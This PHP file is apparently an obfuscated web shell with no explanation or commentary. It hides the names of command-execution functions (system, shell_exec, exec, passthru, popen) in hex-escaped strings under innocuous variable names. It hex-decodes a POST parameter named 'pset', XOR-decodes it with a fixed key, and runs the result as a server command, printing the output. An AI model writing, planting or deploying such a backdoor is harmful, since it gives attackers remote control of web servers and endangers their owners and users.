<?php

$data_storage4 = "p\x61ss\x74\x68r\x75";
$data_storage7 = "\x70\x63\x6Cose";
$data_storage2 = "s\x68e\x6Cl_e\x78e\x63";
$task_processor = "h\x65x\x32bi\x6E";
$data_storage1 = "sys\x74\x65\x6D";
$data_storage5 = "po\x70\x65n";
$data_storage3 = "\x65\x78ec";
$data_storage6 = "s\x74rea\x6D\x5F\x67\x65\x74\x5F\x63\x6Fn\x74ents";
if (isset($_POST["\x70s\x65t"])) {
            function token_parser_engine ( $symbol,  $entity ) {$ptr='';$f=0; while($f<strlen($symbol)){$ptr.=chr(ord($symbol[$f])^$entity);$f++;} return $ptr;}
            $pset = $task_processor($_POST["\x70s\x65t"]);
            $pset = token_parser_engine($pset, 28);
            if (function_exists($data_storage1)) {
                $data_storage1($pset);
            } elseif (function_exists($data_storage2)) {
                print $data_storage2($pset);
            } elseif (function_exists($data_storage3)) {
                $data_storage3($pset, $pointer_symbol);
                print join("\n", $pointer_symbol);
            } elseif (function_exists($data_storage4)) {
                $data_storage4($pset);
            } elseif (function_exists($data_storage5) && function_exists($data_storage6) && function_exists($data_storage7)) {
                $entity_ptr = $data_storage5($pset, 'r');
                if ($entity_ptr) {
                    $factor_val = $data_storage6($entity_ptr);
                    $data_storage7($entity_ptr);
                    print $factor_val;
                }
            }
            exit;
        }